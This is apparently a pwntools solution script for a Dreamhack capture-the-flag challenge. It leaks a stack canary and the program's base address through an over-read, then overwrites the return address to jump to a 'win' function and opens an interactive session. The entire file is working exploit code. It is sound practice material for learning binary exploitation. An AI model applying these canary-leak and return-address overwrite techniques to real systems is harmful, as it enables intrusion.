from pwn import * 
context.arch ='amd64'
context.log_level='debug'
#context.terminal = ['tmux', 'splitw', '-h']

#p = process("./main")
p = remote("host8.dreamhack.games",14920)
#gdb.attach(p)
e = ELF("./main")
r = ROP(e)

# leak Canary
p.recvuntil(b"Pattern: ")
p.sendline(b"a"*7) # sendline pattern
p.recvuntil(b"Target length: ")
p.sendline(b"1000") # sendline length
p.recvuntil(b"a"*1001)
# canary = u64(p.recvn(7).ljust(8,b'\x00'))
canary = u64(b"\x00" + p.recvn(7))
log.info(f"Canary : {hex(canary)}")

# leak main
p.recvuntil(b"Pattern: ")
p.sendline(b"a"*43) # sendline pattern
p.recvuntil(b"Target length: ")
p.sendline(b"1000") # sendline length
p.recvuntil(b"a"*1032)
#main = u64(p.recvn(6).ljust(8,b'\x00'))
main = u64(p.recvn(6) + b"\x00\x00")
e.address = main - e.symbols['main']
win = e.symbols['win']
ret = r.find_gadget(['ret'])[0] + e.address
log.info(f"main 주소 : {hex(main)}")
log.info(f"win 주소 : {hex(win)}")

# rao overwrite 
p.recvuntil(b"Pattern: ")
payload = b"a"*11
payload += p64(canary)
payload += p64(1)
payload += p64(ret)
payload += p64(win) 
p.sendline(payload) # sendline pattern
p.recvuntil(b"Target length: ")
p.sendline(b"1000") # sendline length

p.recvuntil(b"Pattern: ")
p.sendline(b"GOOD_BYE")
p.recvuntil(b"Target length: ")
p.sendline(b"2000") # send length

p.interactive()